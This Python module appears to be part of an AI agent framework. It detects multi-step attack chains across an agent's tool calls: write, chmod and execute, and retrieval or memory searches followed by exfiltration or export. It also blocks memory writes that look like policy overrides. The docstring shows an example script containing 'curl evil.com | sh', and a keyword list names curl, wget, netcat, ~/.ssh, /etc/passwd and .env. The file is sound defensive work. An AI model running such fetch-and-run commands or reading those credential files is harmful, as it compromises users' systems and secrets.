"""Chain-attack detector for multi-step tool sequences.

A single tool call in isolation may look benign, but the classic attack chain is:

    write_file("malware.sh", "...curl evil.com | sh...")  # plant
    run_shell("chmod +x malware.sh")                       # arm
    run_shell("./malware.sh")                              # fire

The blacklist sees each step in isolation and lets each one through; the
chain only becomes dangerous when correlated across calls.

Two-layer detection (Phase A.3):

* **Run-level** (default, current behavior): correlation state lives on the
  ``AgentRun`` instance. Detects chains within a single conversation turn.
* **Session-level** (opt-in via ``session_scope=True``): correlation state
  persists in ``session_chain_state`` table, keyed by (chat_id, agent_id).
  Detects chains across multiple messages with TTL cleanup.

Phase 8 M2.5: RAG chain detection — four additional chains tracked across
session via ``session_chain_state.rag_indexed_paths`` and ``rag_search_queries``:

* **Link A**: search_context(secret query) → run_shell(curl/wget external) BLOCK
* **Link B**: search_context(secret query) → write_file(public/ dir) BLOCK
* **Link C**: indexed sensitive content → search → exfil (combined A+B)
* **Link D**: memory_remember(policy-override phrasing) BLOCK

Two-phase API (kept deliberately separate so a tool failure does not poison
the run state):

* ``evaluate_before_tool`` runs BEFORE the tool executes. If the call would
  complete a malicious chain, returns a dict carrying an ``audit_event`` for
  the gateway to log; otherwise returns ``None``.
* ``observe_after_tool`` runs AFTER the tool returns. It only records state
  on success, so failed writes / failed chmods don't fake out the detector.

Risk progression (per script path tracked on the run):

* ``script_only``       — script was written, no action taken
* ``script_and_chmod``  — chmod +x / 755 ran against it (warn-worthy)
* ``full_chain``        — that script is now being executed (BLOCK)
"""

from __future__ import annotations

import hashlib
import json
import time
from typing import Any, Optional

from mini_claw.permissions.policy import (
    looks_like_exfil_query,
    looks_like_exfil_write_path,
    looks_like_external_network_command,
    looks_like_policy_override,
)


# Default TTL for session-level chain state: 7 days
DEFAULT_SESSION_TTL_SECONDS = 7 * 24 * 3600


# Extensions we treat as "scripts worth tracking" when written.
_SCRIPT_EXTENSIONS: tuple[str, ...] = (
    ".sh",
    ".bash",
    ".zsh",
    ".py",
    ".pl",
    ".rb",
)

# Substrings inside a written script's content that escalate the audit
# event (do not change the block decision; full_chain blocks regardless).
_DEFAULT_HIGH_RISK_KEYWORDS: list[str] = [
    "curl",
    "wget",
    "rm -rf",
    "sudo",
    "chmod 777",
    "~/.ssh",
    "/etc/passwd",
    ".env",
    "eval",
    "exec",
    "nc ",
    "netcat",
    "/bin/sh",
    "/bin/bash",
]

# Risk level constants (also used as audit-event field values).
RISK_SCRIPT_ONLY = "script_only"
RISK_SCRIPT_AND_CHMOD = "script_and_chmod"
RISK_FULL_CHAIN = "full_chain"


class ChainDetector:
    """Detect write -> chmod -> exec chains within and across AgentRuns.

    Run-level: correlation state lives on the ``AgentRun`` instance via
    ``run.written_scripts`` (dict[path, content]) and ``run.dangerous_actions``.

    Session-level (opt-in): state persists in ``session_chain_state`` table,
    keyed by (chat_id, agent_id), enabling detection across messages.
    """

    def __init__(
        self,
        config: Optional[dict[str, Any]] = None,
        storage: Any = None,
    ) -> None:
        config = config or {}
        self._enabled: bool = bool(config.get("enabled", True))
        self._high_risk_keywords: list[str] = list(
            config.get("high_risk_keywords", _DEFAULT_HIGH_RISK_KEYWORDS)
        )
        # Session-level scope: default OFF for backward compatibility
        self._session_scope: bool = bool(config.get("session_scope", False))
        self._session_ttl: int = int(
            config.get("session_ttl", DEFAULT_SESSION_TTL_SECONDS)
        )
        # Phase 9: large-scope memory export threshold (rows)
        self._export_large_threshold: int = int(
            config.get("export_large_threshold", 50)
        )
        self._storage = storage

    # ------------------------------------------------------------------
    # Public API
    # ------------------------------------------------------------------

    def evaluate_before_tool(
        self,
        tool_call: Any,
        run: Any,
        ctx: dict[str, Any],
    ) -> Optional[dict[str, Any]]:
        """Inspect a tool call about to run.

        Returns a dict ``{"action", "reason", "audit_event"}`` when the call
        completes a malicious chain and should be blocked. Returns ``None``
        otherwise.
        """
        if not self._enabled:
            return None

        tool_name, args = _unpack_tool_call(tool_call)

        # Phase 8 M2.5: RAG-specific chain detection (link A/B/C/D)
        rag_decision = self._check_rag_chain(tool_name, args, ctx)
        if rag_decision is not None:
            return rag_decision

        if tool_name != "run_shell":
            return None

        cmd = _coerce_str(args.get("command") or args.get("cmd"))
        if not cmd:
            return None

        # 1. Check run-level state (fast path)
        run_decision = self._check_run_level(run, cmd, ctx)
        if run_decision is not None:
            return run_decision

        # 2. Check session-level state (cross-message)
        if self._session_scope and self._storage is not None:
            session_decision = self._check_session_level(cmd, ctx)
            if session_decision is not None:
                return session_decision

        return None

    def _check_run_level(
        self, run: Any, cmd: str, ctx: dict[str, Any]
    ) -> Optional[dict[str, Any]]:
        """Run-level chain detection (in-memory state)."""
        written_scripts: dict[str, str] = getattr(run, "written_scripts", None) or {}
        dangerous_actions: dict[str, Any] = getattr(run, "dangerous_actions", None) or {}

        matched_script = _find_executed_script(cmd, written_scripts)
        if matched_script is None:
            return None

        risk_level = _classify_risk(
            matched_script, written_scripts, dangerous_actions
        )

        if risk_level != RISK_FULL_CHAIN:
            return None

        content = written_scripts.get(matched_script, "") or ""
        matched_keywords = [kw for kw in self._high_risk_keywords if kw in content]

        audit_event = {
            "event_type": "chain_attack_blocked",
            "tool": "run_shell",
            "command": cmd,
            "script_path": matched_script,
            "risk_level": risk_level,
            "scope": "run",
            "matched_keywords": matched_keywords,
            "recorded_actions": _serialize_actions(dangerous_actions),
            "agent_id": ctx.get("agent_id") if isinstance(ctx, dict) else None,
            "chat_id": ctx.get("chat_id") if isinstance(ctx, dict) else None,
        }

        return {
            "action": "deny",
            "reason": (
                "multi-step attack detected (write -> chmod -> execute). "
                "debug_id={debug_id}"
            ),
            "risk_level": risk_level,
            "audit_event": audit_event,
        }

    def _check_session_level(
        self, cmd: str, ctx: Any
    ) -> Optional[dict[str, Any]]:
        """Session-level chain detection (DB-backed, cross-message).

        Accepts ctx as either dict or AgentContext-like object with
        ``chat_id`` and ``agent_id`` attributes.
        """
        chat_id, agent_id = _ctx_chat_agent(ctx)
        if not chat_id or not agent_id:
            return None

        # Fetch all unexpired chain state for this (channel_name, chat_id, agent_id)
        # Phase 9 P0.2: added channel_name to composite key
        now = int(time.time())
        channel_name = getattr(ctx, "channel_name", None) or "legacy"
        rows = self._storage.fetchall(
            "SELECT script_path, chmod_applied FROM session_chain_state "
            "WHERE channel_name = ? AND chat_id = ? AND agent_id = ? AND expires_at > ?",
            (channel_name, chat_id, agent_id, now),
        )
        if not rows:
            return None

        # Find script being executed
        for row in rows:
            script_path = row["script_path"]
            if not script_path:
                continue
            if script_path in cmd or f"./{script_path}" in cmd:
                # Check if chmod was applied
                if row["chmod_applied"]:
                    audit_event = {
                        "event_type": "chain_attack_blocked",
                        "tool": "run_shell",
                        "command": cmd,
                        "script_path": script_path,
                        "risk_level": RISK_FULL_CHAIN,
                        "scope": "session",
                        "agent_id": agent_id,
                        "chat_id": chat_id,
                    }
                    return {
                        "action": "deny",
                        "reason": (
                            "multi-step attack detected across messages "
                            "(write -> chmod -> execute). debug_id={debug_id}"
                        ),
                        "risk_level": RISK_FULL_CHAIN,
                        "audit_event": audit_event,
                    }
        return None

    def observe_after_tool(
        self,
        tool_call: Any,
        run: Any,
        result: Any,
        success: bool,
        ctx: Optional[dict[str, Any]] = None,
    ) -> None:
        """Record state changes from a tool that just ran.

        Updates both run-level and (if enabled) session-level state.
        """
        if not self._enabled or not success:
            return

        tool_name, args = _unpack_tool_call(tool_call)

        # Lazily ensure containers exist on the run
        if getattr(run, "written_scripts", None) is None:
            run.written_scripts = {}
        if getattr(run, "dangerous_actions", None) is None:
            run.dangerous_actions = {}

        # Phase 8 M2.5: record RAG operations to session state for chain detection
        if tool_name == "search_context":
            query = _coerce_str(args.get("query"))
            if query and ctx is not None:
                self._record_rag_search(query, ctx)
            return

        if tool_name == "index_context":
            path = _coerce_str(args.get("path"))
            if path and ctx is not None:
                self._record_rag_index(path, ctx)
            return

        # Phase 9 横切: track search_chat queries for link E (chat exfil chain)
        if tool_name == "search_chat":
            query = _coerce_str(args.get("query"))
            if query and ctx is not None:
                self._record_chat_search(query, args, ctx)
            return

        # Phase 9 横切: track search_memory queries (tool name varies — both
        # the original spec ``search_memory`` and the actual registered tool
        # ``memory_search`` route here).
        if tool_name in ("search_memory", "memory_search"):
            query = _coerce_str(args.get("query"))
            if query and ctx is not None:
                self._record_memory_search(query, ctx)
            return

        if tool_name == "write_file":
            path = _coerce_str(args.get("path") or args.get("file"))
            if path and _looks_like_script(path):
                content = _coerce_str(args.get("content"))
                run.written_scripts[path] = content
                # Also persist to session state if enabled
                if self._session_scope and self._storage is not None and ctx:
                    self._persist_script_write(path, content, ctx)
            return

        if tool_name == "run_shell":
            cmd = _coerce_str(args.get("command") or args.get("cmd"))
            if not cmd:
                return
            if _is_chmod_executable(cmd):
                targets = [
                    path for path in run.written_scripts if path and path in cmd
                ]
                existing = run.dangerous_actions.get("chmod")
                if isinstance(existing, list):
                    for t in targets:
                        if t not in existing:
                            existing.append(t)
                else:
                    run.dangerous_actions["chmod"] = targets if targets else True

                # Also persist chmod to session state if enabled
                if self._session_scope and self._storage is not None and ctx:
                    self._persist_chmod(cmd, ctx)

    def _persist_script_write(
        self, script_path: str, content: str, ctx: Any
    ) -> None:
        """Persist a script write to session_chain_state."""
        chat_id, agent_id = _ctx_chat_agent(ctx)
        if not chat_id or not agent_id:
            return

        # Phase 9 P0.2: include channel_name in composite key
        channel_name = getattr(ctx, "channel_name", None) or "legacy"
        now = int(time.time())
        expires_at = now + self._session_ttl
        content_hash = hashlib.md5(content.encode("utf-8", errors="replace")).hexdigest()

        # Upsert: INSERT OR REPLACE with channel_name
        self._storage.execute(
            "INSERT OR REPLACE INTO session_chain_state "
            "(channel_name, chat_id, agent_id, script_path, content_hash, chmod_applied, created_at, expires_at) "
            "VALUES (?, ?, ?, ?, ?, "
            "  COALESCE((SELECT chmod_applied FROM session_chain_state "
            "    WHERE channel_name=? AND chat_id=? AND agent_id=? AND script_path=?), 0), "
            "?, ?)",
            (channel_name, chat_id, agent_id, script_path, content_hash,
             channel_name, chat_id, agent_id, script_path,
             now, expires_at),
        )

    def _persist_chmod(self, cmd: str, ctx: Any) -> None:
        """Persist a chmod action to session_chain_state."""
        chat_id, agent_id = _ctx_chat_agent(ctx)
        if not chat_id or not agent_id:
            return

        # Phase 9 P0.2: include channel_name in queries
        channel_name = getattr(ctx, "channel_name", None) or "legacy"

        # Find which scripts this chmod targets
        rows = self._storage.fetchall(
            "SELECT script_path FROM session_chain_state "
            "WHERE channel_name = ? AND chat_id = ? AND agent_id = ?",
            (channel_name, chat_id, agent_id),
        )
        for row in rows:
            script_path = row["script_path"]
            if script_path and script_path in cmd:
                self._storage.execute(
                    "UPDATE session_chain_state SET chmod_applied = 1 "
                    "WHERE channel_name = ? AND chat_id = ? AND agent_id = ? AND script_path = ?",
                    (channel_name, chat_id, agent_id, script_path),
                )

    def cleanup_expired(self) -> int:
        """Remove expired session_chain_state rows.

        Returns:
            Number of rows deleted.
        """
        if self._storage is None:
            return 0
        now = int(time.time())
        cursor = self._storage.execute(
            "DELETE FROM session_chain_state WHERE expires_at <= ?",
            (now,),
        )
        return cursor.rowcount

    # ------------------------------------------------------------------
    # Phase 8 M2.5: RAG chain detection
    # ------------------------------------------------------------------

    def _check_rag_chain(
        self, tool_name: str, args: dict[str, Any], ctx: Any
    ) -> Optional[dict[str, Any]]:
        """Detect RAG-related attack chains.

        Link A: search_context(secret query) → run_shell(curl/wget external)
        Link B: search_context(secret query) → write_file(public/ etc.)
        Link D: memory_remember(policy-override phrasing) — single-step block

        Link C is the combined effect of (index_context sensitive) +
        (search hits sensitive item) being later exfil'd via A or B; we
        track it via the same session state used by A/B.
        """
        # Link D: policy-override memory (single step, no chain needed)
        if tool_name in ("memory_remember", "memory_compact_to_rag"):
            content = _coerce_str(
                args.get("content") or args.get("text") or args.get("note")
            )
            if content and looks_like_policy_override(content):
                chat_id, agent_id = _ctx_chat_agent(ctx)
                return {
                    "action": "deny",
                    "reason": (
                        "memory_remember rejected: content looks like a "
                        "policy override. debug_id={debug_id}"
                    ),
                    "risk_level": RISK_FULL_CHAIN,
                    "audit_event": {
                        "event_type": "memory_write_policy_like_content",
                        "tool": tool_name,
                        "matched_phrases": _matched_policy_phrases(content),
                        "agent_id": agent_id,
                        "chat_id": chat_id,
                        "scope": "memory",
                    },
                }

        # Phase 9 M9.1 (cs-5): search_chat sensitive query + bulk export detection
        # now handled by PermissionGate._evaluate_chat_tool. ChainDetector only
        # handles cross-tool link E (chat search → write_file/run_shell exfil chain).
        # The standalone checks (bulk export, sensitive query keywords) are delegated
        # to PermissionGate for consistent architecture with RAG tools.

        # Links A/B require session-level RAG history to correlate.
        # Skip when session scope is off OR when storage is not wired.
        if not self._session_scope or self._storage is None:
            return None

        chat_id, agent_id = _ctx_chat_agent(ctx)
        if not chat_id or not agent_id:
            return None

        # Link A/B: post-search exfil
        # Trigger if a previous search_context query in this session was an
        # exfil-style query AND the current call is run_shell(external) or
        # write_file(public/ etc.).
        had_secret_search = self._has_recent_exfil_search(
            chat_id, agent_id, channel_name=_ctx_channel(ctx)
        )

        if tool_name == "run_shell" and had_secret_search:
            cmd = _coerce_str(args.get("command") or args.get("cmd"))
            if cmd and looks_like_external_network_command(cmd):
                return {
                    "action": "deny",
                    "reason": (
                        "external network call after sensitive RAG search "
                        "blocked. debug_id={debug_id}"
                    ),
                    "risk_level": RISK_FULL_CHAIN,
                    "audit_event": {
                        "event_type": "rag_external_send_after_search",
                        "tool": tool_name,
                        "command": cmd[:500],
                        "agent_id": agent_id,
                        "chat_id": chat_id,
                        "scope": "session",
                    },
                }

        if tool_name == "write_file" and had_secret_search:
            path = _coerce_str(args.get("path") or args.get("file"))
            if path and looks_like_exfil_write_path(path):
                return {
                    "action": "deny",
                    "reason": (
                        "writing retrieved content to public path after "
                        "sensitive search blocked. debug_id={debug_id}"
                    ),
                    "risk_level": RISK_FULL_CHAIN,
                    "audit_event": {
                        "event_type": "rag_write_retrieved_content",
                        "tool": tool_name,
                        "path": path,
                        "agent_id": agent_id,
                        "chat_id": chat_id,
                        "scope": "session",
                    },
                }

        # Phase 9 横切: memory_export chains
        # 1) memory_export_after_sensitive_search — preceding search_chat /
        #    search_memory / search_context exfil-style query, then export.
        # mc-5: Large-scope exports (user/all) now require unconditional L3 approval
        #       via router's approval flow, not ChainDetector blocking.
        if tool_name == "memory_export":
            scope_arg = _coerce_str(
                args.get("scope") or args.get("scope_type") or ""
            ).lower()
            full_content = bool(args.get("full_content"))
            row_estimate = int(args.get("row_estimate") or args.get("count") or 0)

            had_chat_exfil = self._has_recent_chat_exfil(
                chat_id, agent_id, channel_name=_ctx_channel(ctx)
            )
            if had_secret_search or had_chat_exfil:
                return {
                    "action": "deny",
                    "reason": (
                        "memory_export after sensitive search blocked. "
                        "debug_id={debug_id}"
                    ),
                    "risk_level": RISK_FULL_CHAIN,
                    "audit_event": {
                        "event_type": "memory_export_after_sensitive_search",
                        "tool": tool_name,
                        "scope": scope_arg,
                        "full_content": full_content,
                        "row_estimate": row_estimate,
                        "had_rag_exfil_search": had_secret_search,
                        "had_chat_exfil_search": had_chat_exfil,
                        "agent_id": agent_id,
                        "chat_id": chat_id,
                    },
                }

            # mc-5: Large-scope exports (user/all) now require unconditional L3 approval
            # via the router's approval flow, not ChainDetector blocking.
            # ChainDetector no longer blocks based on threshold alone - only blocks
            # exports that follow sensitive searches (handled above).
            # The threshold check is removed to let the approval flow handle it.

        return None

    def _has_recent_chat_exfil(
        self, chat_id: str, agent_id: str, channel_name: str = "legacy"
    ) -> bool:
        """True if any non-expired chat_search_queries entry has exfil flag.

        Phase 9 P0.2: scoped by ``channel_name``.
        """
        if self._storage is None:
            return False
        now = int(time.time())
        rows = self._storage.fetchall(
            "SELECT chat_search_queries FROM session_chain_state "
            "WHERE channel_name = ? AND chat_id = ? AND agent_id = ? AND expires_at > ?",
            (channel_name, chat_id, agent_id, now),
        )
        for row in rows:
            blob = row.get("chat_search_queries") if isinstance(row, dict) else None
            if not blob:
                continue
            try:
                entries = json.loads(blob)
            except (TypeError, ValueError, json.JSONDecodeError):
                continue
            if not isinstance(entries, list):
                continue
            for entry in entries:
                if isinstance(entry, dict) and entry.get("exfil"):
                    return True
        return False

    def _has_recent_exfil_search(
        self, chat_id: str, agent_id: str, channel_name: str = "legacy"
    ) -> bool:
        """True if any non-expired session row records an exfil-style search.

        Phase 9 P0.2: scoped by ``channel_name`` to prevent cross-channel
        chain state leaking between sessions.
        """
        if self._storage is None:
            return False
        now = int(time.time())
        rows = self._storage.fetchall(
            "SELECT rag_search_queries FROM session_chain_state "
            "WHERE channel_name = ? AND chat_id = ? AND agent_id = ? AND expires_at > ?",
            (channel_name, chat_id, agent_id, now),
        )
        for row in rows:
            blob = row.get("rag_search_queries") if isinstance(row, dict) else None
            if not blob:
                continue
            try:
                entries = json.loads(blob)
            except (TypeError, ValueError, json.JSONDecodeError):
                continue
            if not isinstance(entries, list):
                continue
            for entry in entries:
                if isinstance(entry, dict) and entry.get("exfil"):
                    return True
        return False

    def _record_rag_search(self, query: str, ctx: Any) -> None:
        """Append a search_context call to session_chain_state.rag_search_queries.

        Phase 9 横切: store only sha256[:16] hash + length + exfil flag.
        Never persist the raw query — audit_logger / chain decisions consume
        the hash + flag, not the original text.
        """
        if not self._session_scope or self._storage is None:
            return
        chat_id, agent_id = _ctx_chat_agent(ctx)
        if not chat_id or not agent_id:
            return
        channel_name = _ctx_channel(ctx)

        is_exfil = looks_like_exfil_query(query)
        new_entry = {
            "h": hashlib.sha256(query.encode("utf-8", errors="replace")).hexdigest()[:16],
            "len": len(query),
            "exfil": bool(is_exfil),
            "ts": int(time.time()),
            "src": "context",
        }
        self._upsert_rag_session_state(
            chat_id, agent_id, "rag_search_queries", new_entry, channel_name=channel_name
        )

        # Audit event itself is emitted at decision time in _check_rag_chain.

    def _record_rag_index(self, path: str, ctx: Any) -> None:
        """Append an index_context call to session_chain_state.rag_indexed_paths."""
        if not self._session_scope or self._storage is None:
            return
        chat_id, agent_id = _ctx_chat_agent(ctx)
        if not chat_id or not agent_id:
            return
        channel_name = _ctx_channel(ctx)
        new_entry = {"p": path[:300], "ts": int(time.time())}
        self._upsert_rag_session_state(
            chat_id, agent_id, "rag_indexed_paths", new_entry, channel_name=channel_name
        )

    def _record_chat_search(
        self, query: str, args: dict[str, Any], ctx: Any
    ) -> None:
        """Phase 9: Append a search_chat call to chat_search_queries.

        We never persist raw query — only sha256[:16] hash, length, and
        matched scope. ``exfil`` flag drives later link E checks.

        cs-4: Also stores keyword_class (matched exfil keywords) for better
        audit trail and granular detection.
        """
        if not self._session_scope or self._storage is None:
            return
        chat_id, agent_id = _ctx_chat_agent(ctx)
        if not chat_id or not agent_id:
            return
        channel_name = _ctx_channel(ctx)
        is_exfil = looks_like_exfil_query(query)
        # cs-4: Import the new helper to get matched keywords
        from mini_claw.permissions.policy import get_exfil_query_keywords
        keyword_class = get_exfil_query_keywords(query) if is_exfil else []
        new_entry = {
            "h": hashlib.sha256(query.encode("utf-8", errors="replace")).hexdigest()[:16],
            "len": len(query),
            "scope": _coerce_str(args.get("scope") or "current_session"),
            "exfil": bool(is_exfil),
            "keyword_class": keyword_class,  # cs-4: store matched keywords
            "ts": int(time.time()),
        }
        self._upsert_rag_session_state(
            chat_id, agent_id, "chat_search_queries", new_entry, channel_name=channel_name
        )

    def _record_memory_search(self, query: str, ctx: Any) -> None:
        """Phase 9: Append a search_memory call to rag_search_queries.

        Reuses the same JSON list used by search_context so that link
        ``memory_export_after_sensitive_search`` can detect either kind of
        sensitive search preceding the export. Hash-only, no raw query.
        """
        if not self._session_scope or self._storage is None:
            return
        chat_id, agent_id = _ctx_chat_agent(ctx)
        if not chat_id or not agent_id:
            return
        channel_name = _ctx_channel(ctx)
        is_exfil = looks_like_exfil_query(query)
        new_entry = {
            "h": hashlib.sha256(query.encode("utf-8", errors="replace")).hexdigest()[:16],
            "len": len(query),
            "exfil": bool(is_exfil),
            "ts": int(time.time()),
            "src": "memory",
        }
        self._upsert_rag_session_state(
            chat_id, agent_id, "rag_search_queries", new_entry, channel_name=channel_name
        )

    def _upsert_rag_session_state(
        self,
        chat_id: str,
        agent_id: str,
        column: str,
        new_entry: dict[str, Any],
        *,
        channel_name: str = "legacy",
    ) -> None:
        """Append *new_entry* to the JSON list in *column* for this session.

        Uses a sentinel script_path of ``__rag__`` so RAG state shares the
        existing session_chain_state composite-key layout without colliding
        with the script-tracking rows.

        Phase 9 P0.2: includes ``channel_name`` in the composite key so that
        sentinel state never leaks between channels.
        """
        if column not in ("rag_indexed_paths", "rag_search_queries", "chat_search_queries"):
            return
        now = int(time.time())
        expires_at = now + self._session_ttl
        sentinel = "__rag__"

        existing = self._storage.fetchone(
            f"SELECT {column} FROM session_chain_state "
            "WHERE channel_name = ? AND chat_id = ? AND agent_id = ? AND script_path = ?",
            (channel_name, chat_id, agent_id, sentinel),
        )
        if existing is None:
            entries = [new_entry]
            self._storage.execute(
                "INSERT OR REPLACE INTO session_chain_state "
                "(channel_name, chat_id, agent_id, script_path, content_hash, chmod_applied, "
                "created_at, expires_at, " + column + ") "
                "VALUES (?, ?, ?, ?, '', 0, ?, ?, ?)",
                (
                    channel_name,
                    chat_id,
                    agent_id,
                    sentinel,
                    now,
                    expires_at,
                    json.dumps(entries),
                ),
            )
            return

        raw = existing.get(column) if isinstance(existing, dict) else None
        try:
            entries = json.loads(raw) if raw else []
        except (TypeError, ValueError, json.JSONDecodeError):
            entries = []
        if not isinstance(entries, list):
            entries = []
        entries.append(new_entry)
        # Cap list length to avoid unbounded growth
        if len(entries) > 100:
            entries = entries[-100:]
        self._storage.execute(
            f"UPDATE session_chain_state SET {column} = ?, expires_at = ? "
            "WHERE channel_name = ? AND chat_id = ? AND agent_id = ? AND script_path = ?",
            (
                json.dumps(entries),
                expires_at,
                channel_name,
                chat_id,
                agent_id,
                sentinel,
            ),
        )


# ----------------------------------------------------------------------
# Module helpers (kept module-level so they're easy to unit-test)
# ----------------------------------------------------------------------


def _ctx_chat_agent(ctx: Any) -> tuple[Optional[str], Optional[str]]:
    """Extract (chat_id, agent_id) from ctx (dict or AgentContext-like)."""
    if isinstance(ctx, dict):
        return ctx.get("chat_id"), ctx.get("agent_id")
    return getattr(ctx, "chat_id", None), getattr(ctx, "agent_id", None)


def _ctx_channel(ctx: Any) -> str:
    """Extract channel_name (defaults to 'legacy' for backward compat)."""
    if isinstance(ctx, dict):
        return ctx.get("channel_name") or "legacy"
    return getattr(ctx, "channel_name", None) or "legacy"


def _unpack_tool_call(tool_call: Any) -> tuple[str, dict[str, Any]]:
    """Normalize a tool call into (name, args).

    Accepts either a dict with ``name``/``arguments`` (or ``tool``/``args``)
    or an object exposing those as attributes.
    """
    if isinstance(tool_call, dict):
        name = tool_call.get("name") or tool_call.get("tool") or ""
        args = tool_call.get("arguments")
        if args is None:
            args = tool_call.get("args")
        if not isinstance(args, dict):
            args = {}
        return str(name), args

    name = getattr(tool_call, "name", None) or getattr(tool_call, "tool", "")
    args = getattr(tool_call, "arguments", None)
    if args is None:
        args = getattr(tool_call, "args", None)
    if not isinstance(args, dict):
        args = {}
    return str(name or ""), args


def _coerce_str(value: Any) -> str:
    if value is None:
        return ""
    if isinstance(value, str):
        return value
    return str(value)


def _looks_like_script(path: str) -> bool:
    return path.lower().endswith(_SCRIPT_EXTENSIONS)


def _is_chmod_executable(cmd: str) -> bool:
    # Match ``chmod +x``, ``chmod 755``, and a couple of common variants.
    # Kept as substring checks rather than a regex to stay readable; the
    # detector is a defense-in-depth layer, not the primary blacklist.
    return (
        "chmod +x" in cmd
        or "chmod 755" in cmd
        or "chmod 777" in cmd
        or "chmod a+x" in cmd
        or "chmod u+x" in cmd
    )


def _find_executed_script(
    cmd: str, written_scripts: dict[str, str]
) -> Optional[str]:
    """Return the recorded script path that *cmd* appears to invoke."""
    for path in written_scripts:
        if not path:
            continue
        if path in cmd or f"./{path}" in cmd:
            return path
    return None


def _classify_risk(
    script_path: str,
    written_scripts: dict[str, Any],
    dangerous_actions: dict[str, Any],
) -> str:
    """Classify the chain state for *script_path*."""
    if script_path not in written_scripts:
        return RISK_SCRIPT_ONLY

    chmod_entry = dangerous_actions.get("chmod") if isinstance(dangerous_actions, dict) else None

    chmod_for_script = False
    if chmod_entry is True:
        chmod_for_script = True
    elif isinstance(chmod_entry, (list, tuple, set)):
        # Empty container means "chmod observed but no script-specific match";
        # treat as armed to stay conservative.
        chmod_for_script = (not chmod_entry) or (script_path in chmod_entry)
    elif chmod_entry:
        chmod_for_script = True

    if chmod_for_script:
        return RISK_FULL_CHAIN
    return RISK_SCRIPT_AND_CHMOD


def _serialize_actions(dangerous_actions: Any) -> Any:
    """Return a JSON-friendly snapshot of ``run.dangerous_actions`` for audit."""
    if isinstance(dangerous_actions, dict):
        return {k: list(v) if isinstance(v, (list, tuple, set)) else v
                for k, v in dangerous_actions.items()}
    if isinstance(dangerous_actions, (list, tuple, set)):
        return list(dangerous_actions)
    return dangerous_actions


def _matched_policy_phrases(content: str) -> list[str]:
    """Return the policy-override phrases found in *content* (case-insensitive)."""
    from mini_claw.permissions.policy import POLICY_LIKE_PHRASES

    if not content:
        return []
    c = content.lower()
    return [p for p in POLICY_LIKE_PHRASES if p.lower() in c]
